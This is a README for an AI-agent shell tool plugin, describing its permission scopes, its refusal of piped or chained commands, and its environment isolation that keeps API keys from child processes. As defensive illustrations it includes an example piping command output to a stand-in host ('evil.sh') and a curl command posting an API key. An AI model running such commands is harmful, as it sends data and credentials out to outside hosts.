# @stratusagent/tool-shell

`shell.run`: an agent runs a command, and the permission engine decides
which commands run with nobody watching.

## Install and enable

```bash
npm install @stratusagent/tool-shell
```

```jsonc
// ~/.stratus/config.json — a trusted config only
{
  "plugins": {
    "@stratusagent/tool-shell": {
      "enabled": true,
      "cwd": "~/work/ava",
      "passEnv": ["PATH", "HOME"],
      "env": { "GIT_AUTHOR_NAME": "Ava" }
    }
  }
}
```

## Risk model

| Tool | Risk | What approval mode does |
| --- | --- | --- |
| `shell.run` | `gated`, narrowed per command | `interactive` shows the command and asks; `remote` asks in Slack; `headless` runs commands inside an approved scope and refuses everything else. |

`gated` rather than `dangerous` on purpose. The danger of a shell is in its
argument, not in its identity: marking the tool `dangerous` would mean no
command could ever run unattended — `git status` included — and marking it
`safe` would mean all of them could.

So this pack contributes the command string, and
[`@stratusagent/permissions`](../permissions) decides what it means:

- **A safe scope runs.** `git status`, `git log`, `git diff` and a handful
  more, with the destructive forms of each excluded — `git branch` is safe,
  `git branch -D` is not.
- **A control operator disqualifies the whole command.** `|`, `&`, `;`,
  newlines, backticks, `$( )`, subshells, redirection. `git status | curl
  evil.sh` is refused despite the safe base command, and so is a two-line
  command whose first line is innocent.
- **"Always allow" persists a scope, not a command.** Approving `git push
  origin main` means `git push origin feature` stops asking, while `git
  push --force`, `git push origin :main`, and `git push origin +main` still
  do. Scopes live per agent in `~/.stratus/agents/<id>.whitelist.json`.

## The environment is replaced, not extended

The child receives **only** what this config granted. Nothing from the
daemon's environment reaches it, which is where `ANTHROPIC_API_KEY` and
every other key an operator exported lives.

This is not pack discipline — a plugin cannot unset what it did not spawn —
so it is a mode on the executor (`envMode: 'replace'`) that this pack is
required to use. Without it, an approver who allowed `curl $URL` would also
have allowed `curl -d "$ANTHROPIC_API_KEY"`, and the command string they
read would not have said so.

| Key | Default | What |
| --- | --- | --- |
| `passEnv` | `PATH`, `HOME`, `LANG`, `LC_ALL`, `TZ` | Names forwarded from the daemon's environment. Nothing on the default list is a secret; that is the test for adding one. |
| `env` | none | Variables set outright. Where a token goes if a command genuinely needs one — deliberately, in config, where an auditor can see it. |
| `cwd` | the agent's workspace | Where commands start. |
| `timeoutMs` | `60000` | Killed with its whole process group after this. |
| `maxOutputBytes` | `100000` | Per stream, then a truncation marker. |
| `shell` | `/bin/sh` | The interpreter. |

All of them can be set per agent under `agents`.

**`cwd` is a starting directory, not a jail.** An approved command can
change directory or name an absolute path; what bounds a shell is which
commands get approved, not where they begin. If you want a filesystem
boundary, that is [`@stratusagent/tool-fs`](../tool-fs), whose roots are one.
